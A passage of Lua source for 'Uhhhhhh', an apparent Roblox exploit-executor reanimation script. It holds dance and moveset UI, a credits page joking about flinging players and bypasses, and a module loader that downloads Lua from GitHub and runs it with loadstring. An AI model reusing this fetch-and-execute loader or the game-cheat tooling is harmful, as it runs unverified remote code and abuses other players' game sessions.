				tween.Completed:Connect(function()
					DancesPage.Interactable = true
					page:Destroy()
				end)
			end)
			UI.CreateSeparator(page)
			UI.CreateText(page, m.Name, 20, Enum.TextXAlignment.Left)
			UI.CreateText(page, m.Description, 15, Enum.TextXAlignment.Left)
			local equip, equiptext = UI.CreateButton(page, "Play Dance", 20)
			if CurrentDance == m then
				equiptext.Text = "Stop Dance"
			end
			equip.Activated:Connect(function()
				if CurrentDance == m then
					equiptext.Text = "Play Dance"
					CurrentDance = nil
				else
					equiptext.Text = "Stop Dance"
					CurrentDance = m
				end
			end)
			UI.CreateSeparator(page)
			UI.CreateText(page, "* Configuration *", 15, Enum.TextXAlignment.Center)
			m.Config(page)
			DancesPage.Interactable = false
			local tween = TweenService:Create(page, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
				Position = UDim2.new(0.5, 0, 0.5, 0),
			})
			tween:Play()
			tween.Completed:Connect(function()
				page.Interactable = true
			end)
		end))
		return m.Name
	end
end
local function AddModule(func)
	GiveFunctionsToFunction(func)
	local m = func()
	if m and type(m) == "table" then
		if m.ModuleType == "MOVESET" then
			return AddMoveset(m)
		elseif m.ModuleType == "DANCE" then
			return AddDance(m)
		else
			return nil, "Unknown ModuleType for Module!"
		end
	else
		return nil, "Module return value is not a table. Got " .. typeof(m) .. " instead."
	end
end
local function AddModules(list)
	local names = {}
	local logging = ""
	if type(list) == "table" then
		for i=1, #list do
			local name, logging2 = AddModule(list[i])
			if name then table.insert(names, name) end
			if logging2 then
				logging ..= "\n[ERROR] M" .. i .. ": " .. logging2
			end
			task.wait()
		end
	else
		logging ..= "\n[LOG] Module return value is not a table array of module functions. Skipping."
	end
	logging ..= "\n[LOG] Loaded " .. #names .. " modules."
	return names, logging
end
task.spawn(function()
	local function SaveConfig(m)
		if m.SaveConfig then
			local s, data = pcall(m.SaveConfig)
			if s and data then
				local s2, p = pcall(HttpService.JSONEncode, HttpService, data)
				if s2 and p then
					SaveData.ModuleConfigs[m.Hash] = data
					return
				else
					warn(p)
				end
			else
				warn(data)
			end
			Util.Notify("Failed to save " .. m.Name .. "'s config")
		end
	end
	while task.wait(5) do
		for _,m in MovementStyles do
			SaveConfig(m)
		end
		for _,m in DanceableDances do
			SaveConfig(m)
		end
	end
end)
task.spawn(function()
	local _oldcharacterreference = nil
	local errorsandwarnings = {}
	local currenterrorid = 1
	while true do local dt = RunService.Heartbeat:Wait() xpcall(function(dt)
		local ReanimCharacter = Reanimate.Character
		SaveData.MovesetIndex = MovementStyleIndex
		if ReanimCharacter then
			if _oldcharacterreference ~= ReanimCharacter then
				SetOverrideMovesetMusic(nil)
				SetOverrideDanceMusic(nil)
				if CurrentMovementStyle then
					pcall(CurrentMovementStyle.Destroy, nil)
					CurrentMovementStyle = nil
				end
				if _CurrentDance then
					pcall(_CurrentDance.Destroy, nil)
					_CurrentDance = nil
				end
				_MovementStyleIndex = nil
			end
			if MovementStyleIndex ~= _MovementStyleIndex then
				if CurrentMovementStyle then
					CurrentMovementStyle.Destroy(ReanimCharacter)
					CurrentMovementStyle = nil
				end
				_MovementStyleIndex = MovementStyleIndex
				CurrentMovementStyle = MovementStyles[MovementStyleIndex]
				SetOverrideMovesetMusic(nil)
				if ReanimCharacter:GetAttribute("MovementInit") then
					Reanimate.CreateCharacter()
					ReanimCharacter = Reanimate.Character
				end
			end
			if CurrentMovementStyle then
				if ReanimCharacter:GetAttribute("MovementInit") then
					CurrentMovementStyle.Update(dt, ReanimCharacter)
					if CurrentDance ~= _CurrentDance then
						if _CurrentDance then
							pcall(_CurrentDance.Destroy, ReanimCharacter)
						end
						_CurrentDance = CurrentDance
						ReanimCharacter:SetAttribute("IsDancing", nil)
						ReanimCharacter:SetAttribute("DanceInternalName", nil)
						SetOverrideDanceMusic(nil)
					end
					if _CurrentDance then
						if ReanimCharacter:GetAttribute("IsDancing") then
							_CurrentDance.Update(dt, ReanimCharacter)
						else
							if AssetEnsure(_CurrentDance.Assets) then
								ReanimCharacter:SetAttribute("IsDancing", true)
								ReanimCharacter:SetAttribute("DanceInternalName", _CurrentDance.InternalName)
								_CurrentDance.Init(ReanimCharacter)
							else
								SetOverrideDanceMusic(nil)
							end
						end
					end
				else
					HatReanimator.HatWeldOverride = {}
					if AssetEnsure(CurrentMovementStyle.Assets) then
						ReanimCharacter:SetAttribute("MovementInit", true)
						ReanimCharacter:SetAttribute("MovesetInternalName", CurrentMovementStyle.InternalName)
						table.clear(HatReanimator.HatCFrameOverride)
						CurrentMovementStyle.Init(ReanimCharacter)
					else
						SetOverrideMovesetMusic(nil)
					end
				end
			else
				ReanimCharacter:SetAttribute("MovementInit", nil)
				_MovementStyleIndex = nil
			end
		else
			CurrentDance = nil
			_MovementStyleIndex = nil
			SetOverrideMovesetMusic(nil)
			SetOverrideDanceMusic(nil)
			if CurrentMovementStyle then
				CurrentMovementStyle.Destroy(nil)
				CurrentMovementStyle = nil
			end
			if _CurrentDance then
				_CurrentDance.Destroy(nil)
				_CurrentDance = nil
			end
		end
		_oldcharacterreference = ReanimCharacter
	end, function(m)
		m = debug.traceback("ANIMLOOP :: " .. m)
		local id = errorsandwarnings[m]
		if not id then
			errorsandwarnings[m] = {currenterrorid, 0}
			currenterrorid += 1
			warn("ERROR #" .. errorsandwarnings[m][1] .. ": " .. m)
		else
			id[2] += 1
			if id[2] <= 8192 and math.sqrt(id[2]) % 1 == 0 then
				warn("ERROR #" .. id[1] .. " repeated " .. id[2] .. " times")
			end
		end
	end, dt) end
end)
UI.CreateSeparator(MainPage)
task.wait()
local CreditsPage = UI.CreatePage()
CreditsPage.ZIndex = 1
CreditsPage.Position = UDim2.new(0.5, 360, 0.5, 0)
CreditsPage.Interactable = false
CreditsPage.Visible = false
UI.CreateButton(MainPage, "Credits", 15).Activated:Connect(function()
	CreditsPage.Interactable = false
	CreditsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(CreditsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		CreditsPage.Interactable = true
	end)
end)
UI.CreateButton(CreditsPage, "&lt; Hurry back", 20).Activated:Connect(function()
	CreditsPage.Interactable = false
	MainPage.Interactable = false
	local tween = TweenService:Create(CreditsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		CreditsPage.Visible = false
	end)
end)
local UhhhhhhFire = UI.CreateText(CreditsPage, "", 12, Enum.TextXAlignment.Center)
Util.ForceTextSize(UhhhhhhFire)
UI.CreateText(CreditsPage, "Reanimate by STEVE :D", 15, Enum.TextXAlignment.Right)
local UhhhhhhFiret = UI.CreateSlider(CreditsPage, "Transparency", 0.25, 0, 1, 0)
local UhhhhhhFirep = {}
for i=1, 64 do
	table.insert(UhhhhhhFirep, {i / 64, 0.98 + math.random() * 0.04, math.random(), math.random() - 0.5})
end
local UhhhhhhFirea = {
	"XX    XX XX      XX      XX      XX      XX      XX     ",
	"XX    XX XX      XX      XX      XX      XX      XX     ",
	"XX    XX XXXXXX  XXXXXX  XXXXXX  XXXXXX  XXXXXX  XXXXXX ",
	"XX    XX XX   XX XX   XX XX   XX XX   XX XX   XX XX   XX",
	"XXX  XXX XX   XX XX   XX XX   XX XX   XX XX   XX XX   XX",
	" XXXXXX  XX   XX XX   XX XX   XX XX   XX XX   XX XX   XX",
}
local UhhhhhhFirex = #UhhhhhhFirea[1]
local UhhhhhhFirey = #UhhhhhhFirea
AddToRenderStep(function(t, dt)
	local radius = 0.1
	local ratio = (UhhhhhhFirey / UhhhhhhFirex) * 1.75
	if Util.IsGuiVisible(UhhhhhhFire) then
		local tr = math.clamp(UhhhhhhFiret.Value, 0, 1)
		local pp = {}
		for _,v in UhhhhhhFirep do
			v[1] += dt * v[2]
			if v[1] >= 1 then
				v[1], v[2], v[3], v[4] = 0, 0.98 + math.random() * 0.04, math.random(), math.random() - 0.5
			end
			table.insert(pp, {1 - v[1], v[3] + v[4] * v[1] * 0.25, (1 - v[1]) * (1 + radius / ratio)})
		end
		local aa = {}
		for y=1, UhhhhhhFirey do
			local a = ""
			for x=1, UhhhhhhFirex do
				local b = UhhhhhhFirea[y]:sub(x, x)
				if b == " " and tr < 0.1 then
					a ..= " "
				else
					local bright = 0
					local x1, y1 = x / UhhhhhhFirex, y / UhhhhhhFirey
					for _,v in pp do
						local x2, y2 = v[2], v[3]
						local x3, y3 = x2 - x1, (y2 - y1) * ratio
						local a = math.max(0, 1 - math.sqrt(x3 * x3 + y3 * y3) / radius) * v[1];
						bright += (1.0 - bright) * math.pow(a, 1.5);
					end
					if b == " " then bright *= tr end
					if bright > 0.9 then
						a ..= "Q";
					elseif bright > 0.8 then
						a ..= "W";
					elseif bright > 0.7 then
						a ..= "#";
					elseif bright > 0.6 then
						a ..= "S";
					elseif bright > 0.5 then
						a ..= "l";
					elseif bright > 0.4 then
						a ..= "v";
					elseif bright > 0.3 then
						a ..= "|";
					elseif bright > 0.2 then
						a ..= ";";
					elseif bright > 0.1 then
						a ..= ".";
					else
						a ..= " ";
					end
				end
			end
			table.insert(aa, a)
		end
		UhhhhhhFire.Text = table.concat(aa, "\n")
		pp = nil
	end
end)
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "<b>* Credits to *</b>", 15, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>rez aka @chiptune</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "wow cool 64k demos, great inspiration", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>AALib & BB Demo</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "artificial ascii art cool!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "no transformer needed lol", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Polariaus</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "isnt reanimation dead? oh hats.", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "also ur like a fast bug hunter", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Awesome Awes955</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "u run out of ideas", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "but i dont, cuz u give me ideas", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>MyWorld</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "so thats how netless really works", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "math.max is THE solution here!!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "also, hey, pwease unban me from Hax Updates >m<", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Krystal Dance V3 mod by Theo</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "nice dance animations. MINE NOW!! >:D", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Delta Executor</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "primary env target", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "thanks for disabling the key system temporarily when its down", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "happened fast lol", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Dubmood</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "u and rez REALLY need to collab again or smth", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "the scene is dead was (and still is) so cool!!!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>4mat</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "pls dont kick dubmood's ass lol", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>pouet.net</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "other than rez' and anat's demos theres lots of good demos there", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "tho im considered a LAMER with no scene ID loool", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "so uhhhhhh....", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "...greetings to lamers and fuckings to elites?", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>github.com</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "YES!! KEEP SAVING ME FROM MY DATA CORRUPTION!!!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "no i dont want ur stupid ai subscription", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Those require script databases</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "bro 99% of the characters are LORELESS and SILENT", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>my math teacher</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "i LOVE your method of teaching! its fun!!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>return_request</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "what is DisconnectVerboselyModeratedGame again?", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "also when pissstrap release (and banstrap)", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Termux</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "what a great \"distro\", will u add open document api?", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>anthonyisnthere</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "who r u again? oh ur the one who made skidfling in ur github", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>adamxdd690</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "u got ur new phone! omedeto & ur great!!", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>indexFailed</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "thats a good lua code snippet trade :)", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>Roblox</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "this program's primary target", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "expose more backend functions for me like a good boy", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<b>rqz's Genesis FE</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "ill be taking ALL your convertions >:D", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "actually, im just taking the names, search it up on script sources, read the source, convert it and stuff then done", 12, Enum.TextXAlignment.Center)
--[[UI.CreateText(CreditsPage, "<font color=\"#4444FF\"><b>Empyrean Reanimate (click for Discord)</b></font>", 12, Enum.TextXAlignment.Center).InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Util.Notify("Link copied!")
		pcall(setclipboard, "https://discord.gg/UJ7YtqadPJ")
		pcall(request, {
			Url = "http://127.0.0.1:6463/rpc?v=1",
			Method = "POST",
			Headers = {
				["Content-Type"] = 'application/json',
				["Origin"] = "https://discord.com",
			},
			Body = HttpService:JSONEncode({
				cmd = "INVITE_BROWSER",
				nonce = HttpService:GenerateGUID(false),
				args = {code = "UJ7YtqadPJ"},
			}),
		})
	end
end)
UI.CreateText(CreditsPage, "your tool fling is great reference!", 12, Enum.TextXAlignment.Center)]]
-- now it just takes 2 seconds to take ownership with your method, sorry
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "<b>* Greetings to *</b>", 15, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "fev, inno, rqz, mry7zz, theo, redactedre, colon", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "terminal, guinwah, kasil (just a greet), hoster", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "hamoun, baze, luacope, 2024, 2023 and 2022 me", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "scout, edge, shownape, index, blackhole/whitehole", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "zero from iwbtc for no reason, presidentanvil, mech/catlover", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "return from fishstrap, erika, skeltoun, pala :D", 12, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "awes, boredgal, hamza, nexus", 12, Enum.TextXAlignment.Center)
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "<b>* Very random quotes *</b>", 15, Enum.TextXAlignment.Center)
do
	local quotes = {
		"anthonyisnthere: \":fasttrack Luacope\"\n(funny because most of the music in this script is made in FastTracker II)",
		"hemi once said: \"hat collide has never worked on perma\"",
		"skids after genesis adds a minimize button: \"REVOLUTIONARY\"",
		"\"roblox banned my leg\" sounds the same in any context",
		"what is a 0x1b packet hack? cuz idk wattahel that is", -- oh its some raknet
		"\"i have real fe bypass but i cant show here cuz roblox will detect and patch you have to join me in my game\"",
		"my income is 2 dollars. i shall DELETE /self now /j",
		"obfuscator: gifted power\nreal-time registry dumper: pure effort",
		"always flinging kdrv3 users (they think they'll have antifling)",
		"im gonna fling you. *turns your screen black*",
		"headcanon: \"Lightning Cannon is a top.\"",
		"\"dont bpt ples\" \"brick portationtele?\"",
		"WHO CARES IF A FEW TREES ARE DYING!?",
		"while i was in mwtp, someone said \"leak the hatdrop script\"",
		"i was in fencing, then someone said \"its the genesis killer\"",
		"STEVE, THE DANCING IMMORTALITY LORD!",
		"imagine getting ur script mogged by a script written and tested mostly on a mobile phone LOL",
		"shownskid",
		"this script mogs genesis", -- true-untrue though
		"\"Tired of your hats phasing through people? Uhhhhhh turns that fact upside-down!\"",
		"\"The best part? It is FREE!! (excluding the taxes and bills) Now, BUY OUR PRODUCT FOR FREE! We know you like it! We know you do.\"",
		"Does anyone ever physically look upwards when they think of ideas? I definitely don't.",
		"\"It's not even another Reanimate; it just uses Emper Reanimate. So you can change the name to 'uhhhh hub', that's it.\"",
		"i wrote this during permadeath's patch. my members are so quick in reporting bugs and stuff lol",
		"i plead the six seventh amendment",
		"\"i have strong network ownership that can take big buildings\" \"i have strong network too\" *61 MBPS*",
		"when your script is so good it keeps the reanimation community alive-",
		"i need your hat ids",
		"We can confirm that we were !",
		"Looking At You Just Makes Me Jaded",
		"\"Yo whwho can dm me emeremerian  reanimation\"",
		"boredgal was here..",
	}
	for _=1, 15 do
		local idx = math.random(1, #quotes)
		UI.CreateText(CreditsPage, table.remove(quotes, idx), 12, Enum.TextXAlignment.Center)
	end
end
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "DISCLAIMER: Some random quotes made here are jokes (e.g.: 'this script mogs genesis') and should not be taken seriously. This also includes all the self-glazing quotes. It's your choice to agree with them or not, and if you do or don't, don't come harass/mock any individuals from it. In the end, a joke quote is a joke quote.", 15, Enum.TextXAlignment.Center)
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "This \"software\" is FREE, meaning YOU SHOULD NOT REDISTRIBUTE WITH RENUMERATIVE INTENT!!", 15, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "If you want to add content to Uhhhhhh, like Dances or Movesets, go to <font color=\"#4444FF\">this thing</font>.", 15, Enum.TextXAlignment.Center).InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Util.UINotify("Link copied!")
		pcall(setclipboard, "https://github.com/STEVE-916-create/Uhhhhhh/")
	end
end)
UI.CreateSeparator(CreditsPage)
UI.CreateText(CreditsPage, "<b>(C) 2026 STEVETHEREALONE</b>", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "all rights reserved", 14, Enum.TextXAlignment.Center)
UI.CreateText(CreditsPage, "<font color=\"#4444FF\">[ Discord invite ]</font>", 15, Enum.TextXAlignment.Center).InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		Util.UINotify("Link copied!")
		pcall(setclipboard, "https://discord.gg/NASNUKRBVM")
		pcall(request, {
			Url = "http://127.0.0.1:6463/rpc?v=1",
			Method = "POST",
			Headers = {
				["Content-Type"] = 'application/json',
				["Origin"] = "https://discord.com",
			},
			Body = HttpService:JSONEncode({
				cmd = "INVITE_BROWSER",
				nonce = HttpService:GenerateGUID(false),
				args = {code = "NASNUKRBVM"},
			}),
		})
	end
end)
local ChangelogsPage = UI.CreatePage()
ChangelogsPage.ZIndex = 1
ChangelogsPage.Position = UDim2.new(0.5, 360, 0.5, 0)
ChangelogsPage.Interactable = false
ChangelogsPage.Visible = false
UI.CreateButton(MainPage, "Changelogs", 15).Activated:Connect(function()
	ChangelogsPage.Interactable = false
	ChangelogsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(ChangelogsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		ChangelogsPage.Interactable = true
	end)
end)
UI.CreateButton(ChangelogsPage, "&lt; Hurry back", 20).Activated:Connect(function()
	ChangelogsPage.Interactable = false
	MainPage.Interactable = false
	local tween = TweenService:Create(ChangelogsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		ChangelogsPage.Visible = false
	end)
end)
task.spawn(function()
	UI.CreateText(ChangelogsPage, "Changelogs", 30, Enum.TextXAlignment.Center)
	local content = UI.CreateText(ChangelogsPage, "Loading...", 12, Enum.TextXAlignment.Left)
	xpcall(function()
		local logs = game:HttpGet("https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/CHANGELOGS")
		content.Text = "Rendering error."
		for _,v in string.split(logs, "\n") do
			if v:sub(1, 2) == "# " then
				UI.CreateText(ChangelogsPage, "<b>" .. v:sub(3) .. "</b>", 15, Enum.TextXAlignment.Left)
			else
				UI.CreateText(ChangelogsPage, v, 12, Enum.TextXAlignment.Left)
			end
		end
		content.Parent:Destroy()
	end, function()
		content.Text = "ERROR: Could not fetch"
	end)
end)
task.wait()
local InitLogsPage = UI.CreatePage()
InitLogsPage.ZIndex = 1
InitLogsPage.Position = UDim2.new(0.5, 360, 0.5, 0)
InitLogsPage.Interactable = false
InitLogsPage.Visible = false
UI.CreateButton(MainPage, "Init Logs", 15).Activated:Connect(function()
	InitLogsPage.Interactable = false
	InitLogsPage.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(InitLogsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		InitLogsPage.Interactable = true
	end)
end)
UI.CreateButton(InitLogsPage, "&lt; Hurry back", 20).Activated:Connect(function()
	InitLogsPage.Interactable = false
	MainPage.Interactable = false
	local tween = TweenService:Create(InitLogsPage, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, 360, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
		MainPage.Interactable = true
		InitLogsPage.Visible = false
	end)
end)
local InitLogsText = UI.CreateText(InitLogsPage, "Loading...", 12, Enum.TextXAlignment.Left)
local function _contentgetgithubraw(path)
	InitLogsText.Text ..= "\n[LOG] [GitGET] GET api./" .. path
	local s, resp = pcall(request, {
		Method = "GET",
		Url = "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/content/" .. path,
		Headers = {
			Accept = "application/vnd.github.VERSION.raw"
		}
	})
	if s and resp and resp.StatusCode == 200 then
		return resp.Body
	end
	if s and resp then
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " " .. resp.StatusCode
	elseif s then
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " NIL"
	else
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET api./" .. path .. " ERR " .. resp
	end
	InitLogsText.Text ..= "\n[LOG] [GitGET] GET raw./" .. path
	s, resp = pcall(request, {
		Method = "GET",
		Url = "https://raw.githubusercontent.com/STEVE-916-create/Uhhhhhh/main/content/" .. path,
	})
	if s and resp and resp.StatusCode == 200 then
		return resp.Body
	end
	if s and resp then
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET raw./" .. path .. " " .. resp.StatusCode
	elseif s then
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET raw./" .. path .. " NIL"
	else
		InitLogsText.Text ..= "\n[WARN] [GitGET] GET raw./" .. path .. " ERR " .. resp
	end
	return nil
end
local UserModulesListor = {}
local function ForceModuleReload(force)
	IsUhhhhhhFullyLoaded = false
	InitLogsText.Text = "Init Logs -- This is where you check what happened."
	ClearModules()
	table.clear(UserModulesListor)
	Util.UINotify("Checking hashes...", 0.05)
	InitLogsText.Text ..= "\n[LOG] Checking SHA1 hashes..."
	local filesofbuiltins = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua", "d_limbmap.lua", "d_hatsmap.lua"}
	local filesofbuiltins_m = {"v_moveset1.lua", "v_moveset2.lua", "v_moveset3.lua", "v_dance1.lua", "v_dance2.lua"}
	local filesofbuiltins_d = {"d_limbmap.lua", "d_hatsmap.lua"}
	SaveData.ContentHash = SaveData.ContentHash or {}
	if force ~= "SKIPHASH" then
		xpcall(function()
			local s, resp = pcall(request, {
				Method = "GET",
				Url = "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/content/",
			})
			if s and resp and resp.StatusCode == 200 then
				s, resp = pcall(HttpService.JSONDecode, HttpService, resp.Body)
				if s and resp then
					for _,file in resp do
						if file.name and file.sha then
							if SaveData.ContentHash[file.name] ~= file.sha then
								SaveData.ContentHash[file.name] = file.sha
								if table.find(filesofbuiltins, file.name) then
									local path = "UhhhhhhReanim/BuiltinModules/" .. file.name
									if isfile(path) then
										InitLogsText.Text ..= "\n[LOG] BuiltinModules/" .. file.name .. " has been updated on the repo."
										delfile(path)
									end
								else
									local path = AssetGetPathFromFilename(file.name)
									if isfile(path) then
										InitLogsText.Text ..= "\n[LOG] Downloaded Asset " .. file.name .. " removed because outdated."
										delfile(path)
									end
								end
							end
						end
					end
				end
			end
			InitLogsText.Text ..= "\n[LOG] Checked all SHA1 hashes..."
		end, function()
			InitLogsText.Text ..= "\n[WARN] SHA1 hashes check failed!"
		end)
	else
		InitLogsText.Text ..= "\n[WARN] Chill. We are just reloading user modules."
		InitLogsText.Text ..= "\n[LOG] Checked all SHA1 hashes..."
	end
	local wasold = false
	if SaveData.VanillaModuleCache then
		wasold = true
		SaveData.VanillaModuleCache = nil
	end
	InitLogsText.Text ..= "\n[LOG] Loading maps..."
	for i,x in filesofbuiltins_d do
		Util.UINotify("Loading maps...", 0.15 + (i / #filesofbuiltins_d) * 0.15)
		local path = "UhhhhhhReanim/BuiltinModules/" .. x
		local exist = false
		local s, a = pcall(isfile, path)
		if s and a then exist = true end
		if force == "ALL" then exist = false end
		if exist then
			InitLogsText.Text ..= "\n[LOG] " .. x .. " already downloaded :D"
		else
			InitLogsText.Text ..= "\n[LOG] Downloading MAP " .. x .. "..."
			local content = _contentgetgithubraw(x)
			if content then
				pcall(writefile, path, content)
			else
				InitLogsText.Text ..= "\n[ERROR] Failed to load MAP " .. x .. ": Download failed."
				SaveData.ContentHash[x] = nil
			end
		end
	end
	InitLogsText.Text ..= "\n[LOG] Loading builtin (also called vanilla) modules..."
	for i,x in filesofbuiltins_m do
		Util.UINotify("Loading modules...", 0.325 + (i / #filesofbuiltins_m) * 0.475)
		local path = "UhhhhhhReanim/BuiltinModules/" .. x
		local exist = false
		local s, a = pcall(isfile, path)
		if s and a then exist = true end
		if wasold then exist = false end
		if force == "ALL" then exist = false end
		local data = ""
		if exist then
			InitLogsText.Text ..= "\n[LOG] Reading local VANILLA " .. x .. "..."
			data = readfile(path)
			task.wait()
		else
			InitLogsText.Text ..= "\n[LOG] Downloading VANILLA " .. x .. "..."
			local content = _contentgetgithubraw(x)
			if content then
				pcall(writefile, path, content)
				data = content
			else
				InitLogsText.Text ..= "\n[ERROR] Failed to load VANILLA " .. x .. ": Download failed."
				SaveData.ContentHash[x] = nil
			end
		end
		task.wait()
		InitLogsText.Text ..= "\n[LOG] Loadstringing VANILLA " .. x .. "..."
		xpcall(function()
			local func, comperr = loadstring(data, "Uhhhhhh :: VANILLA " .. x)
			if func then
				local names, logging = AddModules(func())
				InitLogsText.Text ..= logging
			elseif comperr then
				error("COMPILE FAILED: " .. comperr)
			end
		end, function(msg)
			InitLogsText.Text ..= "\n[ERROR] Failed to load VANILLA " .. x .. ": See traceback below."
			InitLogsText.Text ..= "\n[ERROR] " .. table.concat(string.split(debug.traceback("VANILLA " .. x .. ": " .. msg), "\n"), "\n[ERROR] ")
		end)
	end
	Util.UINotify("Loading modules...", 0.8)
	InitLogsText.Text ..= "\n[LOG] Loading user modules..."
	for _,path in listfiles("UhhhhhhReanim/Modules/") do
		if isfile(path) then
			local x = path:sub(23)
			xpcall(function()
